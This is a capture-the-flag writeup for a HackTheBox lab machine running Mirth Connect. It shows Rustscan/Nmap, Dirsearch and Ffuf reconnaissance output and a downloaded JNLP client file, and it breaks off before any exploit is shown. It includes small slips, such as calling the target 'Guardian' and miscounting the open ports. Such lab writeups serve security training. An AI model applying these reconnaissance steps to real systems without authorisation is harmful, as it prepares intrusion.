---
title: Interpreter Writeup
date: 2026-05-31
categories: [HackTheBox Machines, HTB Medium]
tags: [htb, machine, medium]
description: HackTheBox Interpreter Medium Machine Writeup
media_subpath: /assets/img/htb/interpreter/
---

## Adding IP to /etc/hosts

Add your machine IP into your /etc/hosts:
```
10.129.244.184 interpreter.htb
```

## Rustscan

Let's use [Rustscan](https://github.com/bee-san/RustScan)/Nmap to check the ports on the Guardian machine.

```bash
┌─[donutmaster@parrot]─[~/Desktop/HTB/Interpreter]
└──╼ $rustscan -a interpreter.htb -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Exploring the digital landscape, one IP at a time.

[~] The config file is expected to be at "/home/donutmaster/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.244.184:22
Open 10.129.244.184:80
Open 10.129.244.184:443
Open 10.129.244.184:6661
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -A" on ip 10.129.244.184
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-30 15:46 KST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:46
Completed NSE at 15:46, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:46
Completed NSE at 15:46, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:46
Completed NSE at 15:46, 0.00s elapsed
Initiating Ping Scan at 15:46
Scanning 10.129.244.184 [2 ports]
Completed Ping Scan at 15:46, 0.83s elapsed (1 total hosts)
Initiating Connect Scan at 15:46
Scanning interpreter.htb (10.129.244.184) [4 ports]
Discovered open port 80/tcp on 10.129.244.184
Discovered open port 22/tcp on 10.129.244.184
Discovered open port 443/tcp on 10.129.244.184
Discovered open port 6661/tcp on 10.129.244.184
Completed Connect Scan at 15:46, 0.30s elapsed (4 total ports)
Initiating Service scan at 15:46
Scanning 4 services on interpreter.htb (10.129.244.184)
Completed Service scan at 15:48, 175.33s elapsed (4 services on 1 host)
NSE: Script scanning 10.129.244.184.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:48
Completed NSE at 15:49, 23.95s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:49
Completed NSE at 15:49, 6.78s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:49
Completed NSE at 15:49, 0.00s elapsed
Nmap scan report for interpreter.htb (10.129.244.184)
Host is up, received syn-ack (0.61s latency).
Scanned at 2026-05-30 15:46:01 KST for 207s

PORT     STATE SERVICE  REASON  VERSION
22/tcp   open  ssh      syn-ack OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 07:eb:d1:b1:61:9a:6f:38:08:e0:1e:3e:5b:61:03:b9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDVuD7K78VPFJrRRqOF1sCo4+cr9vm+x+VG1KLHzsgeEp3WWH2MIzd0yi/6eSzNDprifXbxlBCdvIR/et0G0lKI=
|   256 fc:d5:7a:ca:8c:4f:c1:bd:c7:2f:3a:ef:e1:5e:99:0f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILAfcF/jsYtk8PnokOcYPpkfMdPrKcKdjel2yqgNEtU3
80/tcp   open  http     syn-ack Jetty
| http-methods: 
|   Supported Methods: GET HEAD TRACE OPTIONS
|_  Potentially risky methods: TRACE
|_http-favicon: Unknown favicon MD5: 62BE2608829EE4917ACB671EF40D5688
|_http-title: Mirth Connect Administrator
443/tcp  open  ssl/http syn-ack Jetty
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|   Supported Methods: GET HEAD TRACE OPTIONS
|_  Potentially risky methods: TRACE
|_http-title: Mirth Connect Administrator
| ssl-cert: Subject: commonName=mirth-connect
| Issuer: commonName=Mirth Connect Certificate Authority
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-19T12:50:05
| Not valid after:  2075-09-19T12:50:05
| MD5:   c251:9050:6882:4177:9dbc:c609:d325:dd54
| SHA-1: 3f2b:a7d8:5c81:9ecf:6e15:cb6a:fdc6:df02:8d9b:1179
| -----BEGIN CERTIFICATE-----
| MIIHDjCCBfagAwIBAgIHAs1vd37U6TANBgkqhkiG9w0BAQsFADAuMSwwKgYDVQQD
| DCNNaXJ0aCBDb25uZWN0IENlcnRpZmljYXRlIEF1dGhvcml0eTAgFw0yNTA5MTkx
| MjUwMDVaGA8yMDc1MDkxOTEyNTAwNVowGDEWMBQGA1UEAwwNbWlydGgtY29ubmVj
| dDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOcl1ZyZfUY55vGMEHQp
| Kv42F90HswreFnh1UZtrRTPBLZEG8Mp4dwsUSdnyZRjWliW/w9E7trGlt2kg9NmS
| 0aH1zwFbRMgO6RvlGH8Y3qSYK1Xz7vz4nq8dklfDQEeHkKOorxkjrHZ5nsIuotQ1
| rMNQ3IO6bGCrzozodanm1kvGADImobIqQg82NUG+lUf33ltW4DA8YosZebcOGtaz
| A0E3ZhEau3izPfhgTYOxYEw0+71uPK1iS1gMPgkZOSEOeatoER0l+tISNGujBwx6
| p0qEOVKuyD1ckPeLQ3W5tySooZHV7dAxtYP5bWEUWIpHWkNENL9hHa1HHu/0hFTh
| xxUCAwEAAaOCBEMwggQ/MIIDBAYDVR0jBIIC+zCCAveAggLzMIIC7zCCAdegAwIB
| AgIBATANBgkqhkiG9w0BAQsFADAuMSwwKgYDVQQDDCNNaXJ0aCBDb25uZWN0IENl
| cnRpZmljYXRlIEF1dGhvcml0eTAgFw0yNTA5MTkxMjUwMDVaGA8yMDc1MDkxOTEy
| NTAwNVowLjEsMCoGA1UEAwwjTWlydGggQ29ubmVjdCBDZXJ0aWZpY2F0ZSBBdXRo
| b3JpdHkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCx5tdSOdln2NVP
| 2ENEc4CQmkkY/1O64NLvBnWr+Zu8AWyzFRBiGceqIXnWIpKWO5xxSObqsMiS2uSL
| Cj3/sprvfX+mojkmrZvpIYDqTQoayWjdI/MAn76VBZrZ4tGyPKibM6msLC/PNeSV
| JtGneR0GtT1yB3VGYfSEOJeIJLa2+PcHERSg2b+xBsrsWmGqwTIwl6NG3MPczmUD
| xomVpz7EpMZFka4slmRT81W9lIpgXl/jVAgLFoZUQ0q7ta1E0WdfeWkjMf0qEF5s
| LSm4UjDRkq/+xR8eZ7K1NBQL+1sUlmyhnfJnTGfik13g0xfpH1WNWsaHbRi6G70M
| zQs51qrlAgMBAAGjFjAUMBIGA1UdEwEB/wQIMAYBAf8CAQAwDQYJKoZIhvcNAQEL
| BQADggEBAFB4ZKwCdqnPqNWZhEi4XRoQY0/5bG/td+XP8a3lyudHQR6+JG8W2/DG
| MreycjnadJCaMn/KfBHULtUgbnpsCSJHQG/xmBS9jeT8NUu2R87xKypU7F0r08A2
| T9bduARSWYAJLF8g3UVGhC1o5fU+t0j3zUVEGKHdlC2GioZV9Jg5e7BIo/iqrLcX
| D6QOBOi509oMLYN40ijI6Q4KT0x01oDemPuirqo6CVg4fKnVjBGdXeWGdsH9DZsK
| O5zpxT2DcNXtFn7WdI+0FlUn+1Az+rFzuQlDZfyUAxiYXtL4ZaOGYKNNjKCECquv
| pdO2OKdCcl6oCIBJfRGDnh2Q7FIqK5wwggEzBgNVHQ4EggEqBIIBJjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOcl1ZyZfUY55vGMEHQpKv42F90Hswre
| Fnh1UZtrRTPBLZEG8Mp4dwsUSdnyZRjWliW/w9E7trGlt2kg9NmS0aH1zwFbRMgO
| 6RvlGH8Y3qSYK1Xz7vz4nq8dklfDQEeHkKOorxkjrHZ5nsIuotQ1rMNQ3IO6bGCr
| zozodanm1kvGADImobIqQg82NUG+lUf33ltW4DA8YosZebcOGtazA0E3ZhEau3iz
| PfhgTYOxYEw0+71uPK1iS1gMPgkZOSEOeatoER0l+tISNGujBwx6p0qEOVKuyD1c
| kPeLQ3W5tySooZHV7dAxtYP5bWEUWIpHWkNENL9hHa1HHu/0hFThxxUCAwEAATAN
| BgkqhkiG9w0BAQsFAAOCAQEAKEQK8YNzAWgPB07ydf05p277ISLa2T+rWzQ2cCPD
| amgc1lCOHK0pEdNMI2z4J+iNdeXiPpuBVgvKId6I8ETLdA7foFRGklv6W6t4MjMY
| Pte8+PPkhKdwRVLzEj/tae427Ar8daDCvyFK/IhunhugyxfywHNj665V+bqPLBGw
| bgiV7+CQKpNOeADBeGbZpEGfQb+U+RkLCpjq7don698TdeBIPcIErzDgS8PDZ217
| Y0o4EU9gaX6U42cpvD/LLZ+e87GRxBlm9ivRA8QAE+yqo8GZtWvYveLkg+7qNcWB
| nWXyOijePyLYSHl4QHn3F4nTx2bO16KspRrDZsmiZGyEIw==
|_-----END CERTIFICATE-----
6661/tcp open  unknown  syn-ack
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:49
Completed NSE at 15:49, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:49
Completed NSE at 15:49, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:49
Completed NSE at 15:49, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 207.59 seconds
```

This is a lot of output from Rustscan as expected, but this is the main part you need to focus on.

```bash
PORT     STATE SERVICE  REASON  VERSION
22/tcp   open  ssh      syn-ack OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 07:eb:d1:b1:61:9a:6f:38:08:e0:1e:3e:5b:61:03:b9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDVuD7K78VPFJrRRqOF1sCo4+cr9vm+x+VG1KLHzsgeEp3WWH2MIzd0yi/6eSzNDprifXbxlBCdvIR/et0G0lKI=
|   256 fc:d5:7a:ca:8c:4f:c1:bd:c7:2f:3a:ef:e1:5e:99:0f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILAfcF/jsYtk8PnokOcYPpkfMdPrKcKdjel2yqgNEtU3
80/tcp   open  http     syn-ack Jetty
| http-methods: 
|   Supported Methods: GET HEAD TRACE OPTIONS
|_  Potentially risky methods: TRACE
|_http-favicon: Unknown favicon MD5: 62BE2608829EE4917ACB671EF40D5688
|_http-title: Mirth Connect Administrator
443/tcp  open  ssl/http syn-ack Jetty
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|   Supported Methods: GET HEAD TRACE OPTIONS
|_  Potentially risky methods: TRACE
|_http-title: Mirth Connect Administrator
| ssl-cert: Subject: commonName=mirth-connect
| Issuer: commonName=Mirth Connect Certificate Authority
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-19T12:50:05
| Not valid after:  2075-09-19T12:50:05
| MD5:   c251:9050:6882:4177:9dbc:c609:d325:dd54
| SHA-1: 3f2b:a7d8:5c81:9ecf:6e15:cb6a:fdc6:df02:8d9b:1179
| -----BEGIN CERTIFICATE-----
| MIIHDjCCBfagAwIBAgIHAs1vd37U6TANBgkqhkiG9w0BAQsFADAuMSwwKgYDVQQD
| DCNNaXJ0aCBDb25uZWN0IENlcnRpZmljYXRlIEF1dGhvcml0eTAgFw0yNTA5MTkx
| MjUwMDVaGA8yMDc1MDkxOTEyNTAwNVowGDEWMBQGA1UEAwwNbWlydGgtY29ubmVj
| dDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOcl1ZyZfUY55vGMEHQp
| Kv42F90HswreFnh1UZtrRTPBLZEG8Mp4dwsUSdnyZRjWliW/w9E7trGlt2kg9NmS
| 0aH1zwFbRMgO6RvlGH8Y3qSYK1Xz7vz4nq8dklfDQEeHkKOorxkjrHZ5nsIuotQ1
| rMNQ3IO6bGCrzozodanm1kvGADImobIqQg82NUG+lUf33ltW4DA8YosZebcOGtaz
| A0E3ZhEau3izPfhgTYOxYEw0+71uPK1iS1gMPgkZOSEOeatoER0l+tISNGujBwx6
| p0qEOVKuyD1ckPeLQ3W5tySooZHV7dAxtYP5bWEUWIpHWkNENL9hHa1HHu/0hFTh
| xxUCAwEAAaOCBEMwggQ/MIIDBAYDVR0jBIIC+zCCAveAggLzMIIC7zCCAdegAwIB
| AgIBATANBgkqhkiG9w0BAQsFADAuMSwwKgYDVQQDDCNNaXJ0aCBDb25uZWN0IENl
| cnRpZmljYXRlIEF1dGhvcml0eTAgFw0yNTA5MTkxMjUwMDVaGA8yMDc1MDkxOTEy
| NTAwNVowLjEsMCoGA1UEAwwjTWlydGggQ29ubmVjdCBDZXJ0aWZpY2F0ZSBBdXRo
| b3JpdHkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCx5tdSOdln2NVP
| 2ENEc4CQmkkY/1O64NLvBnWr+Zu8AWyzFRBiGceqIXnWIpKWO5xxSObqsMiS2uSL
| Cj3/sprvfX+mojkmrZvpIYDqTQoayWjdI/MAn76VBZrZ4tGyPKibM6msLC/PNeSV
| JtGneR0GtT1yB3VGYfSEOJeIJLa2+PcHERSg2b+xBsrsWmGqwTIwl6NG3MPczmUD
| xomVpz7EpMZFka4slmRT81W9lIpgXl/jVAgLFoZUQ0q7ta1E0WdfeWkjMf0qEF5s
| LSm4UjDRkq/+xR8eZ7K1NBQL+1sUlmyhnfJnTGfik13g0xfpH1WNWsaHbRi6G70M
| zQs51qrlAgMBAAGjFjAUMBIGA1UdEwEB/wQIMAYBAf8CAQAwDQYJKoZIhvcNAQEL
| BQADggEBAFB4ZKwCdqnPqNWZhEi4XRoQY0/5bG/td+XP8a3lyudHQR6+JG8W2/DG
| MreycjnadJCaMn/KfBHULtUgbnpsCSJHQG/xmBS9jeT8NUu2R87xKypU7F0r08A2
| T9bduARSWYAJLF8g3UVGhC1o5fU+t0j3zUVEGKHdlC2GioZV9Jg5e7BIo/iqrLcX
| D6QOBOi509oMLYN40ijI6Q4KT0x01oDemPuirqo6CVg4fKnVjBGdXeWGdsH9DZsK
| O5zpxT2DcNXtFn7WdI+0FlUn+1Az+rFzuQlDZfyUAxiYXtL4ZaOGYKNNjKCECquv
| pdO2OKdCcl6oCIBJfRGDnh2Q7FIqK5wwggEzBgNVHQ4EggEqBIIBJjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOcl1ZyZfUY55vGMEHQpKv42F90Hswre
| Fnh1UZtrRTPBLZEG8Mp4dwsUSdnyZRjWliW/w9E7trGlt2kg9NmS0aH1zwFbRMgO
| 6RvlGH8Y3qSYK1Xz7vz4nq8dklfDQEeHkKOorxkjrHZ5nsIuotQ1rMNQ3IO6bGCr
| zozodanm1kvGADImobIqQg82NUG+lUf33ltW4DA8YosZebcOGtazA0E3ZhEau3iz
| PfhgTYOxYEw0+71uPK1iS1gMPgkZOSEOeatoER0l+tISNGujBwx6p0qEOVKuyD1c
| kPeLQ3W5tySooZHV7dAxtYP5bWEUWIpHWkNENL9hHa1HHu/0hFThxxUCAwEAATAN
| BgkqhkiG9w0BAQsFAAOCAQEAKEQK8YNzAWgPB07ydf05p277ISLa2T+rWzQ2cCPD
| amgc1lCOHK0pEdNMI2z4J+iNdeXiPpuBVgvKId6I8ETLdA7foFRGklv6W6t4MjMY
| Pte8+PPkhKdwRVLzEj/tae427Ar8daDCvyFK/IhunhugyxfywHNj665V+bqPLBGw
| bgiV7+CQKpNOeADBeGbZpEGfQb+U+RkLCpjq7don698TdeBIPcIErzDgS8PDZ217
| Y0o4EU9gaX6U42cpvD/LLZ+e87GRxBlm9ivRA8QAE+yqo8GZtWvYveLkg+7qNcWB
| nWXyOijePyLYSHl4QHn3F4nTx2bO16KspRrDZsmiZGyEIw==
|_-----END CERTIFICATE-----
6661/tcp open  unknown  syn-ack
```

We have three main ports open: SSH (22), HTTP (80), and another service (443). Let's check what is on the web application.

## HTTP(80)

### Fuzzing

We can search for possible directories and subdomains with [Dirsearch](https://github.com/maurosoria/dirsearch) and [Ffuf](https://github.com/ffuf/ffuf) respectively.

```shell
┌─[donutmaster@parrot]─[~/Desktop/HTB/Interpreter]
└──╼ $dirsearch -u http://interpreter.htb

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 11460

Output File: /home/donutmaster/Desktop/HTB/Interpreter/reports/http_interpreter.htb/_26-05-30_15-53-23.txt

Target: http://interpreter.htb/

[15:53:23] Starting: 
[15:53:29] 302 -    0B  - /js  ->  http://interpreter.htb/js/
[15:54:34] 302 -    0B  - /css  ->  http://interpreter.htb/css/
[15:54:51] 302 -    0B  - /images  ->  http://interpreter.htb/images/
[15:54:51] 200 -    2KB - /images/
[15:54:56] 200 -  771B  - /js/
[15:55:54] 302 -    0B  - /webadmin  ->  http://interpreter.htb/webadmin/
[15:55:54] 404 -  381B  - /webadmin/admin.php
[15:55:54] 200 -  163B  - /webadmin/
[15:55:54] 404 -  382B  - /webadmin/admin.aspx
[15:55:54] 404 -  443B  - /webadmin/admin.jsp
[15:55:54] 404 -  380B  - /webadmin/admin.js
[15:55:54] 404 -  443B  - /webadmin/index.jsp
[15:55:54] 404 -  381B  - /webadmin/index.php
[15:55:54] 200 -  163B  - /webadmin/index.html
[15:55:54] 404 -  382B  - /webadmin/index.aspx
[15:55:54] 404 -  382B  - /webadmin/admin.html
[15:55:54] 404 -  380B  - /webadmin/index.js
[15:55:54] 404 -  381B  - /webadmin/login.php
[15:55:54] 404 -  443B  - /webadmin/login.jsp
[15:55:54] 404 -  382B  - /webadmin/login.aspx
[15:55:54] 404 -  382B  - /webadmin/login.html
[15:55:55] 404 -  380B  - /webadmin/login.js
[15:55:55] 404 -  378B  - /webadmin/start/
[15:55:55] 404 -  375B  - /webadmin/out
```

```shell
┌─[donutmaster@parrot]─[~/Desktop/HTB/Interpreter]
└──╼ $ffuf -H "Host: FUZZ.interpreter.htb" -u http://interpreter.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 2532

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://interpreter.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.interpreter.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2532
________________________________________________

:: Progress: [4989/4989] :: Job [1/1] :: 134 req/sec :: Duration: [0:00:42] :: Errors: 0 ::
```

We don't find anything useful at the moment.

### Homepage

![Interpreter Homepage](Interpreter%20Homepage.png)

We see an "Access Secure Site" Button, which most likely will show us a sign in page.

![Interpreter Secure Site](Interpreter%20Web%20Dashboard%20Sign%20In.png)

We do see a sign in page! However, this is not very useful at the moment, as we do not have a username nor a password to sign in with.

## Initial Access

### Remote Code Exeuction (RCE)

On the left of both pages, we have "Launch Mirth Connect Administrator" and "Download Administrator Launcher" buttons. Looking at this, it seems like the first one gives us some sort of configuration file, while the second is just a launcher to run the application locally on our machine.

When clicking the first button, it downloads a `.jnlp` file.

```shell
┌─[donutmaster@parrot]─[~/Desktop/HTB/Interpreter]
└──╼ $ls
reports  webstart.jnlp
```

When `cat`ing this file, we get this:

```xml
<jnlp codebase="http://interpreter.htb:80" version="4.4.0">
    	
    <information>
        		
        <title>Mirth Connect Administrator 4.4.0</title>
        		
        <vendor>NextGen Healthcare</vendor>
        		
        <homepage href="http://www.nextgen.com"/>
        		
        <description>Open Source Healthcare Integration Engine</description>
        		
		
        <icon href="images/NG_MC_Icon_128x128.png"/>
        		
        <icon href="images/MirthConnect_Logo_WordMark_Big.png" kind="splash"/>
         
		
		
        <offline-allowed/>
        		
        <shortcut online="true">
                        
            <!-- put a shortcut on the desktop -->
                        
            <desktop/>
                        
            <!-- put shortcut in start menu too -->
                        
            <menu submenu="Mirth Connect"/>
                	
        </shortcut>
            	
	
    </information>
    	
	
    <security>
        		
        <all-permissions/>
        	
    </security>
    	
	
    <update check="timeout" policy="always"/>
    	
	
    <resources>
        		
        <j2se href="http://java.sun.com/products/autodl/j2se" java-vm-args="--add-modules=java.sql.rowset --add-exports=java.base/com.sun.crypto.provider=ALL-UNNAMED --add-exports=java.base/sun.security.provider=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.lang.reflect=ALL-UNNAMED --add-opens=java.base/java.math=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.security=ALL-UNNAMED --add-opens=java.base/java.security.cert=ALL-UNNAMED --add-opens=java.base/java.text=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED --add-opens=java.base/sun.security.pkcs=ALL-UNNAMED --add-opens=java.base/sun.security.rsa=ALL-UNNAMED --add-opens=java.base/sun.security.x509=ALL-UNNAMED --add-opens=java.desktop/com.apple.eawt=ALL-UNNAMED --add-opens=java.desktop/com.apple.eio=ALL-UNNAMED --add-opens=java.desktop/java.awt=ALL-UNNAMED --add-opens=java.desktop/java.awt.color=ALL-UNNAMED --add-opens=java.desktop/java.awt.font=ALL-UNNAMED --add-opens=java.desktop/javax.swing=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED" max-heap-size="512m" version="1.9+"/>
        		
        <j2se href="http://java.sun.com/products/autodl/j2se" max-heap-size="512m" version="1.6+"/>
        	
        <jar download="eager" href="webstart/client-lib/mirth-client.jar" main="true" sha256="IHeDHNaFglz/afA4Osr3nllnqCMpsgo6RmrVTjbKBsA="/>
        <jar download="eager" href="webstart/client-lib/mirth-client-core.jar" sha256="Ms8xCKJF4OPd0YHeM0I+dPyfKB4sdsXHcQsubFBfvz4="/>
        <jar download="eager" href="webstart/client-lib/mirth-crypto.jar" sha256="3QGDVXdCJU/pevR+R0wnBGKnI6Ffuigbt4xNw8IOJKM="/>
        <jar download="eager" href="webstart/client-lib/mirth-vocab.jar" sha256="C20/n2aTWZFxY4x8iEBcrLWGzz5taUMTlWLezAcpCRs="/>
        <jar download="eager" href="webstart/client-lib/commons-lang3-3.9.jar" sha256="Vgwgrwq6WiuqsbpFY2oAq3y8dYHTsrQXc7BT8d4Bjmg="/>
        <jar download="eager" href="webstart/client-lib/jackson-core-2.11.3.jar" sha256="Sn93THoyv2dXoxnx/FGS4YJgW0bWpBuzLPUo2S2fsWw="/>
        <jar download="eager" href="webstart/client-lib/language_support.jar" sha256="sAzNPDx8Zcc+miVKCivSPaJC3fSCwgPE7y/tWM6f48A="/>
        <jar download="eager" href="webstart/client-lib/donkey-model.jar" sha256="rUOeInGLuiIRKZpUgosD/5Jeitea+mMtVfy/WGS8B1Q="/>
        <jar download="eager" href="webstart/client-lib/commons-configuration2-2.7.jar" sha256="QcDVizhsNICZPRi4XT7K+hBgm9KNFdRPLetbna1te80="/>
        <jar download="eager" href="webstart/client-lib/commons-codec-1.13.jar" sha256="rqMdWtimh21sVB/oZf/qwut33nVpNeXVPm74vfuVmKY="/>
        <jar download="eager" href="webstart/client-lib/jetty-util-9.4.44.v20210927.jar" sha256="FwOCGovjairWKH7Rg7r1knTLOnid4R9I0M0EbsjNJ7s="/>
        <jar download="eager" href="webstart/client-lib/log4j-1.2-api-2.17.2.jar" sha256="4Gi6JmmLeoPW/o6DYZMFl8zZoyZIHZ//sPJP27A7AVY="/>
        <jar download="eager" href="webstart/client-lib/javax.annotation-api-1.3.jar" sha256="B9B2My7V8CSIJT6+VqrdC2qTKlHBi5VQtNEcFTDdiI8="/>
        <jar download="eager" href="webstart/client-lib/hk2-locator-2.4.0-b31.jar" sha256="OTY93Favv8bFowgge5fv/nizGE2Vhp7IATYrVwNs6wI="/>
        <jar download="eager" href="webstart/client-lib/velocity-tools-generic-3.0.jar" sha256="ItFZhaj2pSWqreMV0hiT2hpN9Es6wxznasfNlgwomEY="/>
        <jar download="eager" href="webstart/client-lib/mimepull-1.9.7.jar" sha256="IR3nxpVPJFHkB7rqiX14vBJbeg3kLStX30X9XiIgh98="/>
        <jar download="eager" href="webstart/client-lib/zip4j_1.3.3.jar" sha256="Nq0nH85RbGL9D3KOlo1UIciuuhJo75yL4CpSakYXRn0="/>
        <jar download="eager" href="webstart/client-lib/commons-io-2.6.jar" sha256="ETnAc6KUHMebRMv0FKWTlUF7Et8vHlMw3uagiYOQlag="/>
        <jar download="eager" href="webstart/client-lib/commons-collections4-4.4.jar" sha256="nW5g92kH9CucRW1+B3OI4oTvsICWwwd/7hkkbMFdIWc="/>
        <jar download="eager" href="webstart/client-lib/rsyntaxtextarea-2.5.6.jar" sha256="5AwU0m/gEfep5vsTDox3h+iFRielROm8Ee3aD6vTKTQ="/>
        <jar download="eager" href="webstart/client-lib/quartz-all-2.1.7.jar" sha256="s8iEI5/GpBxXvE6bF76gPuzeIsc6H/+6ybO7RIDPxGI="/>
        <jar download="eager" href="webstart/client-lib/commons-text-1.10.0.jar" sha256="mkbZGbj6rJ+DfxfzXg9K71+fjTzg5fKS4q+5hKE6FXY="/>
        <jar download="eager" href="webstart/client-lib/autocomplete-2.5.4.jar" sha256="e4ZfCl5M9ElresOdHO30kzKqv79SxvpW3hWyxsVEK3w="/>
        <jar download="eager" href="webstart/client-lib/utils-2.15.28.jar" sha256="F2h3NoUjlAcsMb7Tzr/1SnHQDE3jLNnk/94nym9ERV4="/>
        <jar download="eager" href="webstart/client-lib/xpp3-1.1.4c.jar" sha256="sRmgN+Q81MVgJ+0eJaPPWatm39tYtHFRx6XxgvtLkec="/>
        <jar download="eager" href="webstart/client-lib/libphonenumber-8.12.50.jar" sha256="tjWFlc1nGTCQKOUgi/w7sWHGmTpeoerafoRZeOM4Q5o="/>
        <jar download="eager" href="webstart/client-lib/log4j-core-2.17.2.jar" sha256="fylUDk4s8265Vk+Y/jvkLsW8x8e5VjJUjTS1v8VEkrs="/>
        <jar download="eager" href="webstart/client-lib/jersey-proxy-client-2.22.1.jar" sha256="kCMvyNtvYX9sgjMt5OnZ2gJ163vYkDhLYoV/xpUs3Co="/>
        <jar download="eager" href="webstart/client-lib/commons-vfs2-2.1.jar" sha256="AeG82Lit+p/45dInSR8cxRZ8Eb2LmIQelpPHRGEG3Fg="/>
        <jar download="eager" href="webstart/client-lib/commons-logging-1.2.jar" sha256="KBnbQ2TXK5shS9/peQgDFVll50w6kAMfBVzKVTgfMV4="/>
        <jar download="eager" href="webstart/client-lib/swagger-annotations-2.0.10.jar" sha256="obRzCEphaiLShGrWm3d1fEGpKaTwmsAN7RVwNpc4ybg="/>
        <jar download="eager" href="webstart/client-lib/xstream-1.4.19.jar" sha256="An1TfdUt/dyRZWO1O4L3OB8/I2JYJnHX/7u7e07lrfs="/>
        <jar download="eager" href="webstart/client-lib/hapi-structures-v28-2.3.jar" sha256="LIlghnHInyIiHFipUqQEqo3w3/JHwBbVXKNhtH3vSpw="/>
        <jar download="eager" href="webstart/client-lib/looks-2.3.1.jar" sha256="YAGKqTQk1/doNoOzJ1me0F2OBO7bRAEa052xk2Y4Qxc="/>
        <jar download="eager" href="webstart/client-lib/jaxb-runtime-2.4.0-b180725.0644.jar" sha256="p+osvQhxLrgqF4woPOlD78SuhWAGS74O3nGOq2lsYt8="/>
        <jar download="eager" href="webstart/client-lib/jcifs-ng-2.1.8.jar" sha256="1LMOZ6bPn/yHjkrqho3k+KVvs0hCENbK4sh0lA7AefE="/>
        <jar download="eager" href="webstart/client-lib/swingx-core-1.6.2.jar" sha256="Krugs5yfMGY+hJP2YtVjQzk2fEBIDqKNL+Mpc0zs93E="/>
        <jar download="eager" href="webstart/client-lib/hapi-structures-v23-2.3.jar" sha256="JlCBJVERFzAiyp4INZU5rdaQqHJRzlusNXYxwvVbNgA="/>
        <jar download="eager" href="webstart/client-lib/hapi-structures-v21-2.3.jar" sha256="SWz11YnwDV8se0huhvnwPbSN3zb+52VnIXrCbxj71os="/>
        <jar download="eager" href="webstart/client-lib/bcutil-jdk18on-171.jar" sha256="/jd5If5JVbQraUTgVMUDOsziWVrAdupKbC2YtCaBEYU="/>
